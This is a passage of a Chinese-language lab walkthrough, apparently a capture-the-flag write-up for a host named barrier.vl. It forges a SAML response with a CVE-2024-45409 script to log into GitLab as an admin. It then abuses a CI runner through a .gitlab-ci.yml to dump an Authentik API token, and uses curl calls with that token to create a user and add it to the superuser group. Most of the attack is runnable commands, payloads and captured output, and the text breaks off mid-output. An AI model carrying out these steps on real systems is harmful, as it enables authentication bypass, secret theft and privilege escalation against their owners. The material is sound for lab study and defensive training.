1eK9ery%2FWxCUyf5w%2B7B%2FF7v779nk1H1HIKgA93Trx09Qv6gN4NRGx2XDKD7FyOkX5m2vQBtc%2FCgjP8Pnv3GZH8G4YdPX7EuGnH%2B%2BNw%2F4PFgSRn4ERv6Fdsf4IffuPOCrX6waVAtsXx4Gf6CC795dxYqvuBQ6hhMn5%2BCOEkonGUSlgA4gmIxwxIExtABTUYkTTAARQIqYlGGCFCECGKCwWmcikiSIFkCCZJv%2Fn4GmvyIsf%2Bm4S8gl3wMYBp%2BIhLKoO8X%2FvTlt08%2B0XP00FvE5vJza7rY7JphyTeIXxhi23TD14X4qfOffHsn%2B5bTN4TD0OXhOIBffvjwKPJvvLOPMlAF%2FaeFbPZN0L4Q0Fv%2F4KAkvPzl8eMFYpjhJYq86uFFNy%2BDOO4e7yQ%2Fen69Wb821P%2F8U55vcN%2Br%2FSj9l%2BC7AOD37y%2FfnmfeHu2%2B%2FAc%3D HTTP/2
Host: gitlab.barrier.vl
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Sec-Gpc: 1
Priority: u=0, i
Te: trailers
Connection: keep-alive

```
</details>

<details>
<summary>CyberChef:只要"URL Decode(Treat "+" as space)","From Base64" 和 "Raw Inflate",什么都不用勾选，直接BAKE!</summary>
	
```
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" xmlns:ds="http://www.w3.org/2000/09/xmldsig#" xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" xmlns:xenc="http://www.w3.org/2001/04/xmlenc#" Version="2.0" IssueInstant="2026-03-30T12:22:04Z" Destination="https://gitlab.barrier.vl/users/auth/saml/callback" ID="_19ae2ad4347c4bfbb78c0654b834a369"><saml:Issuer>authentik</saml:Issuer><samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status><saml:Assertion Version="2.0" ID="_6992bd85cd2e43219516116e3e099645" IssueInstant="2026-03-30T12:22:04Z"><saml:Issuer>authentik</saml:Issuer><ds:Signature>
<ds:SignedInfo>
<ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
<ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>
<ds:Reference URI="#_6992bd85cd2e43219516116e3e099645">
<ds:Transforms>
<ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>
<ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
</ds:Transforms>
<ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
<ds:DigestValue>fI9+uyF4ke1ieN0punbjj6g0dB9P4kdxlZ76P6ZmovA=</ds:DigestValue>
</ds:Reference>
</ds:SignedInfo>
<ds:SignatureValue>hNcR4OJV3JcPghRptiIF4ivoYMcCAaFYPe0XW51KC0RmNTTdjsWYuMK7HoKTgog+
eq+I7uJ7VcqbCJskGQErHjp26qe7ccuubOryD6ly3dYOy2hAqOQS0I38wSd34Vpb
2Lw/+Wzex0SQ9roPTL4XMAZPARmGf+gohZ7P8zIknYWF4y/GSo2qErZO8iY09MIm
D+N/lyUHYK06erjeQO38pzZXkltui2qBKvVv5SHWWQUqqyMG1s5OPKIZxP399D1n
+aPiLPFipJD3Ow+OEZ6fFnOgrjSDZgX9vlDeHHDodw2Ja342L6BxCHx6nU9iqGaJ
ZBTDpNnjSA2Eu/vlRifLi9lgEbybYVKkBQaTEoWP1jkx4qGxUzIqqKYguZBnHMYk
d1TW989BKrKChB5LSmW+PcmK9WAXRz4oS7yLcyM86GP2s6Z8Yd673Dp3MWlIH2CN
PD9vDUeVt0eoVkFNbhj7IVQnXsNJ0dI6EbCKiH6NDy2F1sYmrJZXCF875+yoqk59
CHhSUeVstq5bmPpqHFpPpJ0VvLDtCmbLv59UI3IKbtFx5hd+CqlJhXA4B9CfXyuI
/tgcTRPyEz/HY3iJWk1s7hsQKhrcZpBJx+iInoOVvHUSDi63flI6wryYuIsavUMn
zmIDcuGas8BBThrHPO24cXwg7ZPZ7mEIdCHwg59IBSk=</ds:SignatureValue>
<ds:KeyInfo>
<ds:X509Data>
<ds:X509Certificate>MIIFUzCCAzugAwIBAgIQKtQS95zOTi6Uhb7Oomo4tDANBgkqhkiG9w0BAQsFADAe
MRwwGgYDVQQDDBNhdXRoZW50aWsgMjAyNC4xMC41MB4XDTI0MTIxNDE1MzgwN1oX
DTI1MTIxNTE1MzgwN1owVjEqMCgGA1UEAwwhYXV0aGVudGlrIFNlbGYtc2lnbmVk
IENlcnRpZmljYXRlMRIwEAYDVQQKDAlhdXRoZW50aWsxFDASBgNVBAsMC1NlbGYt
c2lnbmVkMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAw4S8GGf2x07B
iDyFD3TKHGB9tFn0RI0FemZaCfCx2RUWzqCV+yPzB+fzC1Pf8UMgIP8dgeZmp3HQ
G3djppDhij+I+mETvLQdSQh8rk9ytUMW1eLgNTvNEH0IH1xEJEcmHOTPwcSNrezk
yIo0OZWGBFp8Vl3gGzLceJupdau9FUYiVOG4peUdSjrYP6xLN8IPo16Kh1+j8xD+
jZ8Nqjkx/GR70mfgPjqSO1EACjpHyjzhsruK43dTycDbxqOoY13pRrExo7U9YlEO
zFrpteP21sHLzd0k+80CPq/ZPWlXsIafJ18JOF+QWCD8K/HFmbCp9ihd3pQSZqka
0Hx2zRFyxBBGwtoWvOLWk+q+bbYLdXYiSXOHaZyx8bPF93U2qPUD0Td+IeQp8unx
SrruWV70L5Bts1iy6cQm8v/f1RF/Q0tQPpgSAaG/hxcSgOA4xLwBXR1yeGnfWP3w
VuTrSIAUObym+gJB4gGHFPmGdny9WthMQSebbyBGFjHBclquWAT4Tg7TSGg25SYk
Fo/XYHQ4m+TbpIA7RYsjreAkj6HOAaM8gsuX7qHLdN7w34G5l4eXviP0nFPoJ3Xv
ZC9h6NxCuvqaHEfB+9+ce2liuE8YFYAboWJLYcMrc+BDuT0Gt5RPs8FUUCgvU+Pp
OiDBOtLQmW9zXCQ5SLbdPU3AnEMaJysCAwEAAaNVMFMwUQYDVR0RAQH/BEcwRYJD
OUJXckhKaFBlMnRES3JNc04yUzlJQ1RpMFpnS0RQSVhaU1pDVWxoYS5zZWxmLXNp
Z25lZC5nb2F1dGhlbnRpay5pbzANBgkqhkiG9w0BAQsFAAOCAgEArshIX0felsel
T8D7iexndo+s272a0iVO/hZQU6jOPkwiyM2g5KrxBKzWOBTku3xlkF/qegukcVok
+EYNXuYuRyI9OFfTZzuDNnMkJyyxd8Vwhwt5NJRLUYJlXupAvPrkf6TkfmCJlGyf
YPzmmdPdXHCFtJxmyJoO00uLIy+03FvPEA1OiwCid8aQcFA/1u5BTSa3KZBo6BFC
QhNL/+xXo+oMz1cZKEr8hC28iUxSvLfQAtXQtPn9gp15vLl7ZfoPCFRLg3ED1vop
djAnWHcCs0JOoYlOt9dYSjtuiEIzNkJiM5Oge28OcBYYSXb0euYljzTbxzPo5Kt7
hCHJzNfXXcklLFiryCOLB2EZm36ICuBLVbZiARyHb8OkRQm7OoJ/uvWuScHXnLO0
pTSf9sH1SmDYGjk3/PDjkHHJAdaFQ21uABnfIWlmjF4suTmVIMbrtUOthnRdpX/f
DgDb/Y551jLfXH2Y7/OXgnehw/aHv9u4TF6TYqpNwdMtGjC+9IE7+pK6Kwk/K0u7
UMXOdBYWY4bvFphOWD1sgHQYdq2ArYPnEKUoLyl3wkadNWr2VUCmDJLCI17H3xru
fur17k7t1pNvUajUeXqBrqgfLqVfSOgkfRhESiqVVZvY5ErZ5CQjz9cIWy2d3xDu
GnA/5mkO/2YDN3/Ne05Xnf+MVB+8nuw=
</ds:X509Certificate>
</ds:X509Data>
</ds:KeyInfo>
</ds:Signature><saml:Subject><saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">satoru</saml:NameID><saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer"><saml:SubjectConfirmationData NotOnOrAfter="2026-03-30T12:27:04Z" Recipient="https://gitlab.barrier.vl/users/auth/saml/callback"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore="2026-03-30T12:17:04Z" NotOnOrAfter="2026-03-30T12:27:04Z"/><saml:AuthnStatement AuthnInstant="2026-03-30T12:17:04Z" SessionIndex="adff6398f94e3012d8944287a75c5748e10a6c9184a104ad483736c5545940af" SessionNotOnOrAfter="2026-05-29T12:22:04Z"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement><saml:AttributeStatement><saml:Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress"><saml:AttributeValue>satoru@barrier.vl</saml:AttributeValue></saml:Attribute></saml:AttributeStatement></saml:Assertion></samlp:Response>
```
</details>

#### 将其保存saml.xml
```
[★]$ vi saml.xml

[★]$ wget https://raw.githubusercontent.com/synacktiv/CVE-2024-45409/refs/heads/main/CVE-2024-45409.py
[★]$ pip3 install lxml
[★]$ python3 CVE-2024-45409.py -r saml.xml -n akadmin
[+] Parse response
	Digest algorithm: sha256
	Canonicalization Method: http://www.w3.org/2001/10/xml-exc-c14n#
[+] Remove signature from response //删除原签名
[+] Patch assertion ID		//修改 Assertion
[+] Patch assertion NameID
[+] Patch assertion conditions		//Conditions修改时间限制：NotBefore、NotOnOrAfter；否则SAML 可能会过期 → 登录失败
[+] Move signature in assertion
[+] Patch response ID		//冒充用户 akadmin
[+] Insert malicious reference		//插入恶意引用	
[+] Clone signature reference	//克隆签名引用
[+] Create status detail element	//插入 StatusDetai，隐藏/承载恶意结构（绕解析）
[+] Patch digest value		//重新计算摘要
[+] Write patched file in response_patched.xml
```
#### CyberChef:"Raw Deflate","To Base64","URL Encode(Encode all special chars"
<details>
<summary>Output</summary>
	
```
7XhZk6LK1va9Ef6HitqXRDWTKFTsrngZRFCZZBC8eYMhQWSUQZFff9Ia%2BlTX17u%2FPuf6jTBCc2Xm47OmzFzr79Yv8vp5B9q6KlvwMBR52T6%2FCr8%2F9k35XPlt2j6XfgHa5y58Nlll%2B0x8w57rpuqqsMofP235%2FQ6%2FbUHTpVX5sSVqvz8eu65%2BRtHr9frtSn6rmgQlMAxDMQaFa6I2Tf76WF1Ev4cvQOdHfud%2FrB9AGf4DPo5iszs%2BXAHhHdC0kNX3R4jy%2BCC3bQ%2Fksu38soMijJg%2FYbMnjLCwxTNGPVPk4fFBAG2Xlv5dl7d%2FaOFfJGmX%2B8G3wG%2BaFDTfLjnaQ31b1O%2B7I3q3Dhr6eR74YQb%2FRPj%2BKAtPcyxicBDHT1gYL55mxDx%2BoiM8fooiZkEzVESE4fzx5dVFz6%2B8mpc7Gii7NPv7FfND%2FO5Gs%2FO7vv15xFcReHD8vAe%2Ftx%2FUGK5%2BNvswBG37iP6MIkDrpvnL31ELYyUGDTQdeLB38vfHv%2F43nIVxPCcBiMh4BnzAAIqMsQVFgZCkwpB6fJnc91mNX7Zx1RTty%2FRnwQObJ1WTdsfiTwIClBeQVzWInuAIeqFvAGT7n0LiKI7dIZ%2FAED6F%2BKz86w0E%2FRVTIU2gyxXQHavoD5D%2FHV3t0Seo%2BQ96bzivznhxrm64o3u2uyU1b%2FmIQiCAXTpU4qTjuGRsr0t0J7QxRJK%2Fv7L6vPmd6A9XvAp%2B5a%2BfhO%2BhxH4k4tfQh1H5%2F3fmn2TIn8UsVMD88OC7ge5jEMllXL0LeL%2BsyhRmTjq%2B5tsf%2B%2BDX3v38l%2F%2BhO%2B%2Bx91RUDfiraf2nL479L3LiS8D%2BX1Lc47ooxpPmRM0Ck47xmZgnw%2BXsq14xQyld3ao5sreog7iI9hT7h0nxq6D6EQJv%2B3qO3%2FjjliJRWs9Kc9XhrH7eJ7nnIvFKz63c8uvRuDEbbSy3uEuV5Ixqh7JJSKo%2B50U1nVyc62kNEkojRe%2FgayDNZxvFrXHGX%2BToNtFsYnXdE9EiHqqwM%2BNMBzNs21VrtFeMYM2Y0wnG78OYqcA8c4pbGdfpZd0aAyeuyUHxRhkf%2BoHP143juxdbcuaDYfPBCqXnFh8zS5ksphMqddNEsItdatqW0VdHIrCzprl5yAklqIoiLzvgWUhqbZvMPFSU6iyZjuKTU7dRvIvgTSdim21z03ZDishC3hCdQuZLycV2SCPVe80%2BVVGYMJJPeRkuHwOR8wrenu3V6ITZa4MxppM5gbZitB01ajHUw45A573nkuu1Si7OZ9XWjueFMlu4NAucyilO21iiaWedx4UhkLpDgelkLXf5jTtiHWREzjRM8bvrai%2BcQ40Z8lk07l1kNBSkKCVOsKV0sDZsR%2BQjdebMNbOY7aeTmx8qejffIHsv2RyCUyQxm96PdoclzTtrZcisGOXR%2Fao4zQTWRLaJvYznl4VKRXtNPJvkdGLtVS9R2QaLUMrv6zlDnyjtfLkWJDy4slUWAjdr5eiYmajtqiQY1nXpactzIAS2p3sr6M0GBYuLy48tQHYxHy1jB8SENViHpVVzlUDS4ORXM9e43fqm4xflIcdlLzBtUqdkfbOdThaXErnUVprrw3iWz8fZEgHNHDlxKd34ClfG5TWXlXgYb%2B1bInyJ6bdA34Dbp7B3KYwR4Avp05C%2FXwQxPF878KLIsmiPPM%2BOfcJeZY5NZGPTGSZDjZqVzu1jsNCqopp1AqtySXY%2BZumKuWIca7QiK7DQecruel0lnuAYhiBw6jFyd9VhT2H%2Bvk2UE3tT%2Bdmg8DNc4WauYMmYYsmDKixxZUyuKl650wmU4q9S64f06pyWZ4VPVixuL9nr9ei5DuavnD5a5Y0sqnmw8rqQyMugcLLpRF6qeVju6kORnzx3lys7%2BbpkXzltBDb%2FzGkQYQBwiepwbKvw%2BBvSdPKBBe3By6evui5FltV4NqHZ%2BzyfbOBvSGtm0qtVTAzYgptOUuEmCqS1kVYc04kltpMxERQHn4%2F5gdjZ%2B%2FHMO8hNHzkkHnlcj2lbSWSdjhJwKGpSgom0IqNTXQvH9ITISLG0LlsjMo0j3WTMrbOVPQ62iWpd1KWEyRI%2BLNfLsJA0S7%2BGptqAEdrhJleYdtivOLGmnZxMVuM2BOu%2BjvyeEW0vdbTVrAZ2ZJ4aT58PW5WW9Qqfb444cqIHAZlOTgdaPZ%2ByAV3tFlgRJ%2FrpbGr4kuVPtXQ7jce26TczMrJuoRAMZ63ycLLeNcuhWtiMly%2B16WQUm7oDOoG30naMsAyhMV4%2Fowd9n7ut7MdrnF5rImLseYHeoJJYBHzNpMeIrA3zcM58mEjSQIw78TZw3OraVfuLtt1nyBkJAm8buV5quprkH24DHegiQ9rEWbcFzIoQGRg13ZfDdGI2Tb93FtiW4roWT2%2Fz0CjoCxrjOxE1sM7Q68Rk%2FRV6HEIz0djZsL1y7g6%2FgVUZ73XyOp04vdWYMmtrwa1AkjU3S1aSqBerqLwx%2B%2B6oGCYIghu3Ek8SF%2Bbnfs9aMytZWOYqISjTg74QK9T1JGNWIFZQy%2Bxi57WnBrDZaS5prK%2FQSdu7i7O0jdTFlZytqHwG3EuqY6WoV2vSvUwnB545ztWB7%2BF1KC1jDmGQEBB52i9pT%2FTYoNqvt16oNCHCCb2FrTpqp7e0aNt8crERvZ5OtFTgtG5rFHtmdHmDMrdBpNskWy4Vf31reRZmCeurjiIqV9uA%2BbLDdqwhodwyvO68tQAR7LUbZseNL3K5Uu6WJrlWQ2x2s8d8beC7WhHr0sR2hukcfRuvBWc%2FVJ5JjYf9UGxdFXI4EFR%2B4KkyIEQ8Wh3zAOapf6PqYPzFifKaZUu2aY%2Byi8Ugb0EOj2ZaWKRgKKMKaYkF4WMwjtHjwbDnJ03PrulNIRJq0wzcZtxrnJX15JBnInoGSZ%2BFTgV9gSw91e29fneTGU2MrcPYC2qpZOvbbYho53q8dpS63m1tb527fc1e9CaL51YWF%2Fw6X93i6cTTx6KI9MiVeLFbD8VtXWkY1m%2FlG4KR4kVfsriWXvk0on0jFFkU7ynOMn1yc%2BCqOSfy04lxVLcoMrgVUikjHh42y4Y%2B8gSd2oN52cYG27lGp5dMUuPUZZsvDnGl8%2BJum5BLAb9U0JLRiS33Usi32BomXq51TOSZp65Pl%2FKoZutUobQEELQWcp5nugEGei8%2FjVYwjHpFbbrFdHLkpfWoxi50ab4V0%2BbGa1uOWB4Kci7zPbd1gkPK7m5SQGvZzijg0Q9fK5d9b4aSW241bDqpLTNmWgk3C8FbnTIS1YVTJklrNvJFg8B7Ft5S8j4vTuKs7a3CkZWg6WytO5a7qHZRaEkhEQLUoygcvgRcifAWqObCp9rxivrShelnlji3vHOtXiOlW514hJGXC6TezDfXDN1gPdTCVlwt4ry9NwsuYn3U9gLeJpLhRWeChedaudzY1faWk9fMj9R9Qzg2XwjrLS%2FjC4kcmn46ifsGX2SLDq%2FVi%2B2fbOCeueacxNuzE5taksW749JMz45zuHjUsjlQvHEamVDe34iIHASIsCpZlCoyDSU8QSVRFWCUW8aI4nAIXfbX7%2B%2Bv0K%2FX7Sfxx6V8H3%2B6sn%2B61t9LKrMPTiDs3kcqrOJl4UGEr3If1mL%2FVN7j3%2FBXSRo93R%2Fwfvfcl20NQkgFRI8vPjROkZbv1dkb5s9%2Fx1dlnN433ovGtxf%2F75sJYfEcAL8BzUcp%2BAugu9YPatVppdawcQeaT8UkeS8mcfwZv7dbdpBpncIK8r9qtsBGxptiv6DwZeqdK1wRpffp9k6PA9BmsHfypdDF3lpBf8D%2FvZPyzEJu5b0QBwXU5eF1%2BE9l9Du6CTsxkIdcRmD4%2FsjgoU8Rc5Jg8JiisQUeUDjwF2EQzEKcni9mQTj3aTLySQIDjE%2FNQobC5oAkCRhjBICdsXe8PyD9mTO0RweGD%2Bt8FvE5bOrBeuvlt32%2F8Dm8r4NiHX5dqybSYfMQ2htEr0VlXTXduyN%2BCf6LuZ9kP2z6wbDrmjToO%2FCPEw%2F3IP9RqbbhERR%2B%2Bw2Wp23l168l67W9V60UCj9pdG9edDcUapEWLQrXprkfRc29TfYV%2Be313fpd1fT%2F8%2B%2Fw%2FKD787Kv0v9H8EmB95mP1s2Pzs5H5%2FblXw%3D%3D
```
</details>

#### 现在我们可以复制 response.xml 中的值，并将其粘贴到 BurpSuite 中 Responder 里等待处理的请求中，替换原有的 SAML,只Send，不要forward(难怪要在HTTP History)
<details>
<summary>查看 BurpSuite 中的 HTTP History</summary>
	
```
HTTP/2 302 Found
Server: nginx
Date: Tue, 31 Mar 2026 08:18:26 GMT
Content-Type: text/html; charset=utf-8
Location: https://gitlab.barrier.vl/
Cache-Control: no-cache
Content-Security-Policy: 
Permissions-Policy: interest-cohort=()
Set-Cookie: known_sign_in=RkdoeG9aOUxMNFJsZ1E0TXkrWVQwdTkzTVkzS1EzVDhWekgzYUs2SzBJMEQ1b1JKSytyVjVkZWdlYXRDa053ZHIzOU9KRTlVOU5iRnlselExb3RDbUZFWCtFdldRNHJ4WjlINEs1bnJjN3ljNEhsSHJtUFJCeTJYaXkxZHZJSDEtLVZzYkVwcC9PSGxlM3NwbEsyYkJnYnc9PQ==--72e09105317fa1aaff61c7d89c93ebe56e515469; path=/; expires=Tue, 14 Apr 2026 08:18:26 GMT; secure; HttpOnly; SameSite=None
Set-Cookie: _gitlab_session=9f20f9dd81e2e09d159ae574566c8e7b; path=/; secure; HttpOnly; SameSite=None
X-Content-Type-Options: nosniff
X-Download-Options: noopen
X-Frame-Options: SAMEORIGIN
X-Gitlab-Meta: {"correlation_id":"01KN1FHYEGKARYPAJQ6250P7D2","version":"1"}
X-Permitted-Cross-Domain-Policies: none
X-Request-Id: 01KN1FHYEGKARYPAJQ6250P7D2
X-Runtime: 0.226688
X-Ua-Compatible: IE=edge
X-Xss-Protection: 1; mode=block
Strict-Transport-Security: max-age=63072000
Referrer-Policy: strict-origin-when-cross-origin

<html><body>You are being <a href="https://gitlab.barrier.vl/">redirected</a>.</body></html>
```
</details>

#### 我们应该能看到两个“Set-Cookie”，可以直接复制到新的浏览器中(在拦截的后的进入的页面粘贴cookie，然后刷新网页，我们就会以 akadmin 的身份登录了。
```
%3D%3D 要变成 ==（URL解码）
```
![图片](images/2026040209.png)
### CI/CD
#### 在akdamin的下面‘admin' -> 'CI/CD' -> 'Runners' -> '#1 (sT3k7uGUy)' -> 'Hide details'
```
Tags: auto_5e7f
```
```
r_UoO8ZxRAxNdi	
Online Idle 	17.6.0 (374d34fd) 	172.17.0.1	docker	amd64/linux	40 minutes ago
```
#### 如果我们创建一个新的仓库，并为其提供一个引用此运行器标签 auto_5e7f 的构建文件，那么它将自动由该运行器进行构建。当作业开始时，运行器会拉取我们在构建文件中指定的镜像，并从该镜像启动一个全新的容器。然后我们还可以指定在该容器内执行的命令。
#### 要创建构建文件，我们需要找到主机上已存在的 Docker 镜像。我们可以假设 redis:alpine 或 postgres:16-alpine 可能已经存在，因为它们是 Authentik 的 Docker Compose 安装说明中使用的镜像。在该页面中，我们还看到 Authentik 的默认用户是 akadmin，并且 Docker 容器环境变量包含 Authentik 的密钥。
https://docs.goauthentik.io/install-config/install/docker-compose
#### 所以此时我们将尝试利用该运行器。我们可以在新生成的 Docker 容器中获取反向 shell，但会被限制在该环境中。或者我们可以推测可能存在敏感信息的位置。当容器启动时，它会从运行器的执行环境中继承环境变量，这很可能意味着它会包含 Authentik 的密钥。
#### 如果这个变量被暴露出来，那么或许它可以作为我们的认证令牌，我们可以用它来查询 API，从而为我们利用 Authentik 开启多种功能（如手册中所述）。由于 Authentik 似乎是该系统中大多数服务的访问授权服务，所以它是一个不错的下一个目标。
https://api.goauthentik.io/
#### 首先，点击“Resume”来激活运行器。然后，我们将创建一个新项目。
#### 'Overview' -> 'projects' -> 'New Project' -> 'Create blank project'
![图片](images/2026040210.png)
#### 接下来，我们将通过指定“redis:alpine”或“postgres:16-alpine”作为镜像、运行器标签以及我们希望在启动时执行的命令来创建构建文件 .gitlab-ci.yml。在这种情况下，我们将使用“env”命令来显示容器的环境变量。
```
#.gitlab-ci.yml

image:
    name: redis:alpine
    pull_policy: if-not-present

stages:
  - build 

job_build:
  stage: build
  script:
    - env
  tags:
    - auto_5e7f
```
#### 将.gitlab-ci.yml文件：'Download'后‘Upload new file' 
#### 接下来，我们可以查看“Jobs”部分，那里应该已经有一个名为“job_build”的新任务了。
#### 我们看到一个新的 Docker 容器被启动，它为我们执行了“env”命令。
![图片](images/2026040211.png)
#### 再向下滚动一点，我们就能找到“AUTHENTIK_TOKEN”这个参数了。
```
98 AUTHENTIK_TOKEN=MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc
```
### Authentik
#### 既然我们已经找到了 Authentik 令牌，就可以尝试用它来进行授权以访问 API 的各种功能。根据手册，让我们通过使用 cURL 向 /api/v3/core/users 端点发送 GET 请求来查看注册用户账户。
https://api.goauthentik.io/reference/core-users-list/
<details>
<summary>curl -L 'http://barrier.vl:9000/api/v3/core/users/' -H 'Authorization: bearer MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc' | jq</summary>

```
[★]$ curl -L 'http://barrier.vl:9000/api/v3/core/users/' -H 'Authorization: bearer MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc' | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  4308  100  4308    0     0  27556      0 --:--:-- --:--:-- --:--:-- 27439
{
  "pagination": {
    "next": 0,
    "previous": 0,
    "count": 4,
    "current": 1,
    "total_pages": 1,
    "start_index": 1,
    "end_index": 4
  },
  "results": [
    {
      "pk": 2,
      "username": "ak-outpost-af1fa701dddb44f98ddf2c3868733303",
      "name": "Outpost authentik Embedded Outpost Service-Account",
      "is_active": true,
      "last_login": null,
      "is_superuser": false,
      "groups": [],
      "groups_obj": [],
      "email": "",
      "avatar": "<SNIP>",
      "attributes": {},
      "uid": "2698567113c1ff76765c3baaa33db04c022784564d91d0c65ef03f41961282cf",
      "path": "goauthentik.io/outposts",
      "type": "internal_service_account",
      "uuid": "3737be82-3c55-4195-b639-478c339edb35"
    },
    {
      "pk": 4,
      "username": "akadmin",
      "name": "authentik Default Admin",
      "is_active": true,
      "last_login": "2025-06-18T09:25:04.724776Z",
      "is_superuser": true,
      "groups": [
        "a38fb983-8b71-4bf2-b5a7-42ab9fdd58e8" 			<-------
      ],
      "groups_obj": [
        {
          "pk": "a38fb983-8b71-4bf2-b5a7-42ab9fdd58e8",
          "num_pk": 21741,
          "name": "authentik Admins",
          "is_superuser": true,
          "parent": null,
          "parent_name": null,
          "attributes": {}
        }
      ],
      "email": "admin@barrier.vl",
      "avatar": "<SNIP>",
      "attributes": {},
      "uid": "c19f414ee26028d6fe42f90a393920de1c1f8b5428d3efe76b72f302efe78742",
      "path": "users",
      "type": "internal",
      "uuid": "4d9587ad-641d-4879-a8dd-edf2a24e1bf5"
    },
    {
      "pk": 35,
      "username": "maki",
      "name": "maki",
      "is_active": true,
      "last_login": null,
      "is_superuser": false,
      "groups": [],
      "groups_obj": [],
      "email": "",
      "avatar": "<SNIP>",
      "attributes": {},
      "uid": "6d9a5a5ca034c7dd59f0b63547f402ceed837476b2b43bc58338ed74630b8651",
      "path": "users",
      "type": "internal",
      "uuid": "5840e7f6-f396-493a-b41d-9433df6df996"
    },
    {
      "pk": 34,
      "username": "satoru",
      "name": "satoru",
      "is_active": true,
      "last_login": "2026-04-02T07:52:51.177022Z",
      "is_superuser": false,
      "groups": [],
      "groups_obj": [],
      "email": "satoru@barrier.vl",
      "avatar": "<SNIP>",
      "attributes": {},
      "uid": "e0c306c91c800ecb0343d535bf8211fcd85ebeafb17966eb9a5b5146c99724cb",
      "path": "users",
      "type": "internal",
      "uuid": "91da4edd-f03d-4cdc-80af-102371b10905"
    }
  ]
}
```
</details>

#### 这显示了 4 个现有的用户：akadmin、satoru、maki 以及 authentik 服务账户。它也会显示哪些用户是超级用户，甚至还会显示“认证管理员”组的信息。
#### 此时，我们可以尝试更改现有超级用户的密码，比如“akadmin”，或者我们也可以
#### 创建自己的超级用户！让我们使用相同的端点，但这次我们将提供一些数据来创建用户“superadmin”。按照文档说明，我们不能在这里设置密码，但稍后我们会使用另一个功能。
```
[★]$ curl -L 'http://barrier.vl:9000/api/v3/core/users/' -H 'Content-Type: application/json' -H 'Authorization: Bearer MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc' -d '{ "username": "superadmin", "name": "superadmin"}' jq
{"pk":36,"username":"superadmin","name":"superadmin","is_active":true,"last_login":null,"is_superuser":false,"groups":[],"groups_obj":[],"email":"","avatar":"<SNIP>","attributes":{},"uid":"0e89e359cf32c3efeecb057458a53528a5b799dd5067d7915bd7a15e082dbb74","path":"users","type":"internal","uuid":"34d6027a-4477-4757-8312-279b20f52d95"}curl: (6) Could not resolve host: jq
```
#### 我们的用户已创建完成，我们可以获取用户的 pk 或 ID，然后通过端点 /api/v3/core/users/{pk}/set_password/ 来设置密码：
```
[★]$ curl -L 'http://barrier.vl:9000/api/v3/core/users/36/set_password/' -H 'Content-Type: application/json' -H 'Authorization: Bearer MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc' -d '{ "password": "Pa$$word123!"}'
```
#### 最后，并没有特定的步骤可以将我们的用户直接设置为超级用户。不过，我们可以将他们添加到 authentik 管理员组中，这样他们就能继承权限并成为超级用户。我们将针对端点 /api/v3/core/groups/{group_uuid}/add_user/ 进行操作，其中我们会包含组的 PK，然后在请求体中提供我们用户的 PK。
```
[★]$ curl -L 'http://barrier.vl:9000/api/v3/core/groups/a38fb983-8b71-4bf2-b5a7-42ab9fdd58e8/add_user/' -H 'Content-Type: application/json' -H 'Authorization: Bearer MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc' -d '{ "pk": 36}'
```
#### 如果我们再次列出用户列表，就能确认我们的更改是否生效。我们应当能在列表的末尾看到新添加的用户，其“is_superuser”参数已被设置为“true”：
<details>
<summary>curl -L 'http://barrier.vl:9000/api/v3/core/users/' -H 'Authorization: bearer MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc' | jq</summary>
	
```
[★]$ curl -L 'http://barrier.vl:9000/api/v3/core/users/' -H 'Authorization: bearer MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc' | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  5455  100  5455    0     0  39991      0 --:--:-- --:--:-- --:--:-- 40110
{
  "pagination": {
    "next": 0,
    "previous": 0,
    "count": 5,
    "current": 1,
    "total_pages": 1,
    "start_index": 1,
    "end_index": 5
  },
  "results": [
    {
      "pk": 2,
      "username": "ak-outpost-af1fa701dddb44f98ddf2c3868733303",
      "name": "Outpost authentik Embedded Outpost Service-Account",
      "is_active": true,
      "last_login": null,
      "is_superuser": false,
      "groups": [],
      "groups_obj": [],
      "email": "",
      "avatar": "<SNIP>",
      "attributes": {},
